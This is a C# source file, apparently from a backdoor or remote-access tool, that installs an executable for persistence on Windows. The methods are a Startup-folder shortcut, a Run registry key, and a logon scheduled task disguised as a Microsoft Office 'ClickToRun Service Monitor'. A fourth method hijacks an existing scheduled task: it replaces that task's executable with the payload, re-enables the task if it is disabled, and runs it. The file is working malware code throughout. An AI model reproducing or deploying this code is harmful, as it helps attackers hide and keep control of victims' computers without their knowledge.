using Microsoft.Win32;
using System;
using System.Collections;
using System.IO;
using System.Xml;
using TaskScheduler;

namespace websocket
{
    class StartupWay
    {
        /*******************************************************************************
         * Copy From https://blog.csdn.net/arrowzz/article/details/69808761
         * Modify By MrFooL
         * 引用 COM: TaskScheduler & Windows Script Host Object Model
         *******************************************************************************/
        public bool doStartUpWay(int startupCode, string RootPath, string ServiceName, string changeName)
        {
            string FullServicePath = RootPath + ServiceName + ".exe";
            switch (startupCode)
            {
                case 886:
                    //无任何动作
                    break;
                case 0:
                    // 获取当前登录用户的 开始 文件夹位置
                    string nowUserPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
                    FileStartUp(nowUserPath, ServiceName, FullServicePath);

                    // 获取全局开始文件夹位置 [全局开始文件夹存在权限问题可能导致添加启动项失败 后期可增加提权]
                    //string allUserPath = Environment.GetFolderPath(Environment.SpecialFolder.CommonStartup);
                    //FileStartUp(allUserPath, ServiceName, FullServicePath);
                    break;
                case 1:
                    // 添加到 当前登陆用户的 注册表启动项
                    RegistryKey RKey = Registry.CurrentUser.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                    RKey.SetValue(ServiceName, @"""" + FullServicePath + @"""");//防止生成路径带有空格导致的启动失败

                    // 添加到 所有用户的 注册表启动项 [权限问题]
                    //RegistryKey RKey = Registry.LocalMachine.CreateSubKey(@"SOFTWARE\Microsoft\Windows\CurrentVersion\Run");
                    //RKey.SetValue(ServiceName, @""""+ FullServicePath + @"""");//防止生成路径带有空格导致的启动失败
                    break;
                case 2:
                    if (0 == 0)
                    {
                        //尝试添加计划任务
                        string author = "Microsoft Office";
                        string desc = "This task monitors the state of your Microsoft Office ClickToRunSvc and sends crash and error logs to Microsoft.";
                        string name = "Office ClickToRun Service Monitor";
                        string file = FullServicePath;
                        //新建计划任务
                        TaskSchedulerClass scheduler = new TaskSchedulerClass();
                        //连接
                        scheduler.Connect(null, null, null, null);
                        //获取创建任务的目录
                        ITaskFolder folder = scheduler.GetFolder("\\");
                        //设置参数
                        ITaskDefinition task = scheduler.NewTask(0);
                        task.RegistrationInfo.Author = author;//创建者
                        task.RegistrationInfo.Description = desc;//描述
                                                                 //设置触发机制（此处是 登陆后）
                        task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_LOGON);
                        //设置动作（此处为运行exe程序）
                        IExecAction action = (IExecAction)task.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
                        action.Path = file;//设置文件目录
                        task.Settings.ExecutionTimeLimit = "PT0S"; //运行任务时间超时停止任务吗? PT0S 不开启超时
                        task.Settings.DisallowStartIfOnBatteries = false;//只有在交流电源下才执行
                        task.Settings.RunOnlyIfIdle = false;//仅当计算机空闲下才执行

                        IRegisteredTask regTask =
                            folder.RegisterTaskDefinition(name, task,//此处需要设置任务的名称（name）
                            (int)_TASK_CREATION.TASK_CREATE, null, //user
                            null, // password
                            _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN,
                            "");
                        IRunningTask runTask = regTask.Run(null);
                        break;
                    }
                case 3:
                    //判断当前用户是否存在计划任务
                    TaskSchedulerClass taskScheduler = new TaskSchedulerClass();
                    taskScheduler.Connect();
                    ITaskFolder taskFolder = taskScheduler.GetFolder(@"\");
                    var taskList = taskFolder.GetTasks(0);

                    if (taskList.Count != 0)
                    {
                        ArrayList taskPath = new ArrayList();
                        ArrayList taskName = new ArrayList();
                        string runTaskPath;
                        string runTaskName;
                        int isFoundTask = 0;
                        Random r = new Random();

                        foreach (IRegisteredTask task in taskList)
                        {
                            //寻找已开启的任务
                            if (task.State.ToString() == "TASK_STATE_RUNNING" || task.State.ToString() == "TASK_STATE_READY")
                            {
                                isFoundTask = 1;//标记已找到
                                taskName.Add(task.Name);//记录名字

                                XmlDocument doc = new XmlDocument();
                                doc.LoadXml(task.Definition.XmlText.Replace(" version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"", ""));//某种奇怪的原理导致必须删除此段才可获取到数据
                                XmlElement root = null;
                                root = doc.DocumentElement;
                                XmlNodeList listNodes = null;
                                listNodes = root.SelectNodes("/Task/Actions/Exec/Command");//获取任务路径
                                //获取劫持任务路径
                                foreach (XmlNode node in listNodes)
                                {
                                    taskPath.Add(node.InnerText);
                                    if (taskPath.Count >= 10)
                                    {
                                        break;//只取十个
                                    }
                                }

                            }
                        }

                        //寻找未开启的任务
                        if (isFoundTask == 0)
                        {
                            foreach (IRegisteredTask task in taskList)
                            {
                                //寻找已开启的任务
                                if (task.State.ToString() == "TASK_STATE_DISABLED")
                                {
                                    taskName.Add(task.Name);//记录名字

                                    XmlDocument doc = new XmlDocument();
                                    doc.LoadXml(task.Definition.XmlText.Replace(" version=\"1.2\" xmlns=\"http://schemas.microsoft.com/windows/2004/02/mit/task\"", ""));//某种奇怪的原理导致必须删除此段才可获取到数据
                                    XmlElement root = null;
                                    root = doc.DocumentElement;
                                    XmlNodeList listNodes = null;
                                    listNodes = root.SelectNodes("/Task/Actions/Exec/Command");//获取任务路径
                                    //获取劫持任务路径
                                    foreach (XmlNode node in listNodes)
                                    {
                                        taskPath.Add(node.InnerText);
                                        if (taskPath.Count >= 10)
                                        {
                                            break;//只取十个
                                        }
                                    }
                                }
                            }
                        }

                        int num = r.Next(0, taskPath.Count);//随机选中一个任务
                        runTaskPath = taskPath[num].ToString();//路径
                        runTaskName = taskName[num].ToString();//名字

                        //劫持
                        string path2 = runTaskPath.Replace(".exe", "") + changeName + ".exe";//备份并改名 使用避免重复的名字 防止覆盖已存在文件
                        FileInfo fi1 = new FileInfo(runTaskPath);
                        FileInfo fileService = new FileInfo(RootPath);

                        fi1.CopyTo(path2);//备份原文件
                        fi1.Delete();//删除原文件
                        fileService.CopyTo(runTaskPath);//顶替原文件

                        IRegisteredTask openTask = taskFolder.GetTask(runTaskName);

                        if (openTask.State.ToString() == "TASK_STATE_DISABLED")
                        {
                            openTask.Enabled = true;//开启被禁用任务
                        }

                        IRunningTask runningTask = openTask.Run(null);//执行任务

                        break;
                    }
                    else
                    {
                        //系统自身不存在计划任务时尝试添加
                        string author = "Microsoft Office";
                        string desc = "This task monitors the state of your Microsoft Office ClickToRunSvc and sends crash and error logs to Microsoft.";
                        string name = "Office ClickToRun Service Monitor";
                        string file = FullServicePath;
                        //新建计划任务
                        TaskSchedulerClass scheduler = new TaskSchedulerClass();
                        //连接
                        scheduler.Connect(null, null, null, null);
                        //获取创建任务的目录
                        ITaskFolder folder = scheduler.GetFolder("\\");
                        //设置参数
                        ITaskDefinition task = scheduler.NewTask(0);
                        task.RegistrationInfo.Author = author;//创建者
                        task.RegistrationInfo.Description = desc;//描述
                                                                 //设置触发机制（此处是 登陆后）
                        task.Triggers.Create(_TASK_TRIGGER_TYPE2.TASK_TRIGGER_LOGON);
                        //设置动作（此处为运行exe程序）
                        IExecAction action = (IExecAction)task.Actions.Create(_TASK_ACTION_TYPE.TASK_ACTION_EXEC);
                        action.Path = file;//设置文件目录
                        task.Settings.ExecutionTimeLimit = "PT0S"; //运行任务时间超时停止任务吗? PT0S 不开启超时
                        task.Settings.DisallowStartIfOnBatteries = false;//只有在交流电源下才执行
                        task.Settings.RunOnlyIfIdle = false;//仅当计算机空闲下才执行

                        IRegisteredTask regTask =
                            folder.RegisterTaskDefinition(name, task,//此处需要设置任务的名称（name）
                            (int)_TASK_CREATION.TASK_CREATE, null, //user
                            null, // password
                            _TASK_LOGON_TYPE.TASK_LOGON_INTERACTIVE_TOKEN,
                            "");
                        IRunningTask runTask = regTask.Run(null);
                        break;//暂不判断是否添加成功
                    }
            }
            return true;
        }

        public static bool FileStartUp(string directory, string shortcutName, string targetPath, string description = null, string iconLocation = null)
        {
            try
            {
                if (!Directory.Exists(directory))
                {
                    Directory.CreateDirectory(directory);
                }

                //添加引用 Com 中搜索 Windows Script Host Object Model
                string shortcutPath = Path.Combine(directory, string.Format("{0}.lnk", shortcutName));
                IWshRuntimeLibrary.WshShell shell = new IWshRuntimeLibrary.WshShell();
                IWshRuntimeLibrary.IWshShortcut shortcut = (IWshRuntimeLibrary.IWshShortcut)shell.CreateShortcut(shortcutPath);//创建快捷方式对象
                shortcut.TargetPath = targetPath;//指定目标路径
                shortcut.WorkingDirectory = Path.GetDirectoryName(targetPath);//设置起始位置
                shortcut.WindowStyle = 1;//设置运行方式，默认为常规窗口
                shortcut.Description = description;//设置备注
                shortcut.IconLocation = string.IsNullOrWhiteSpace(iconLocation) ? targetPath : iconLocation;//设置图标路径
                shortcut.Save();//保存快捷方式

                return true;
            }
            catch
            {
                return false;
            }
        }
    }
}
